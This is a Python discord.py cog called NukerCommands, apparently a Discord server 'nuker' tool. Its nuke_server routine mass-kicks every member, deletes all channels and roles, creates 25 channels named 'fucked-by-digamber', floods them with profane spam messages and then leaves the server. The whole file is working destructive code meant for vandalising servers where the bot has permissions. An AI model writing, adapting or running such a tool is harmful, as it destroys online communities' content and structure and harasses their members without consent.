import discord
from discord.ext import commands
import asyncio
import random

class NukerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def nuke_server(self, guild):
        try:
            # STEP 1: INSTANT MASS KICK (PEHLE YEH)
            print("🚫 INSTANT KICKING ALL MEMBERS...")
            kick_tasks = []
            for member in guild.members:
                if member != self.bot.user:
                    kick_tasks.append(member.kick(reason="Fucked By Digamber"))
            
            # SABHI KO EK SAATH KICK - INSTANT
            await asyncio.gather(*kick_tasks, return_exceptions=True)
            print("✅ ALL MEMBERS KICKED INSTANTLY!")
            
            # STEP 2: Delete all channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                except:
                    continue
            
            # STEP 3: Create fucked channels
            for i in range(25):
                try:
                    await guild.create_text_channel(f"fucked-by-digamber-{i+1}")
                except:
                    break
            
            # STEP 4: MESSAGE SPAM IN ALL CHANNELS
            try:
                channels = await guild.fetch_channels()
                spam_tasks = []
                
                message_styles = [
                    "# Fucked by Digamber",
                    "## Fucked by Digamber", 
                    "### Fucked by Digamber",
                    "**FUCKED BY DIGAMBER**",
                    "__FUCKED BY DIGAMBER__",
                    "***FUCKED BY DIGAMBER***",
                    "```FUCKED BY DIGAMBER```",
                    "> FUCKED BY DIGAMBER",
                    ">>> FUCKED BY DIGAMBER",
                    "**# FUCKED BY DIGAMBER**",
                    "💀 **FUCKED BY DIGAMBER** 💀",
                    "🔥 **FUCKED BY DIGAMBER** 🔥",
                    "⚡ **FUCKED BY DIGAMBER** ⚡"
                ]
                
                for channel in channels:
                    if isinstance(channel, discord.TextChannel):
                        # Har channel mein 3-5 messages
                        for _ in range(random.randint(3, 5)):
                            msg = random.choice(message_styles)
                            spam_tasks.append(channel.send(msg))
                
                if spam_tasks:
                    await asyncio.gather(*spam_tasks, return_exceptions=True)
            except:
                pass
            
            # STEP 5: Delete roles
            for role in guild.roles:
                if role.name != "@everyone":
                    try:
                        await role.delete()
                    except:
                        continue
            
            # STEP 6: Send final message
            try:
                channels = await guild.fetch_channels()
                if channels:
                    await channels[0].send("💀 **FUCKED BY DIGAMBER** 💀")
            except:
                pass
            
            await guild.leave()
            
        except Exception as e:
            try:
                await guild.leave()
            except:
                pass

async def setup(bot):
    await bot.add_cog(NukerCommands(bot))
